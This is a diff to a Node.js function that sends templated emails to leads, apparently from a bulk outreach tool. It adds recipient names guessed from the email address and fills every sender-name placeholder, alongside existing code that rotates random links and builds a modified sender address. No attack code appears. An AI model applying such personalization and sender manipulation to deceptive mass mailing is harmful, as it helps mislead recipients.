@@ -995,11 +995,24 @@ async function sendEmail(to, lead, leadSenderName) {
   const emailTemplate = fs.readFileSync(path.join(__dirname, 'email_template.html'), 'utf-8');
   const randomLink = CONFIG.emailLinks[Math.floor(Math.random() * CONFIG.emailLinks.length)];
 
+  // Format recipient name from email (similar to formatEmailLocalPartAsName)
+  const recipientLocalPart = to.split('@')[0];
+  let recipientName = recipientLocalPart.replace(/[._-]/g, ' ').split(' ').map(word => {
+    if (word.length === 0) return '';
+    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
+  }).join(' ');
+  
+  // Fallback if recipient name is empty or too short
+  if (!recipientName.trim() || recipientName.length <= 2) {
+    recipientName = 'Colleague';
+  }
+
   let htmlContent = emailTemplate
     .replace('{random_link}', randomLink)
     // Removed logo replacement as per user request
     .replace('{email_user}', to.split('@')[0])
     .replace('{recipient_email}', to)
+    .replace('{recipient_name}', recipientName)
     .replace('{timestamp}', new Date().toLocaleString());
 
   // Construct the 'from' address using the pre-determined leadSenderName
@@ -1024,7 +1037,10 @@ async function sendEmail(to, lead, leadSenderName) {
 
   // Use the leadSenderName directly
   fromAddress = `${leadSenderName} <${modifiedAccountSenderEmail}>`;
-  htmlContent = htmlContent.replace('{sender_name}', leadSenderName);
+  // Replace all occurrences of {sender_name} in the template
+  while (htmlContent.includes('{sender_name}')) {
+    htmlContent = htmlContent.replace('{sender_name}', leadSenderName);
+  }
 
   // Construct the original email's subject and body
   const originalSubject = 'Hello from ' + leadSenderName + ' at ' + (lead && lead.companyName ? lead.companyName : 'our company');
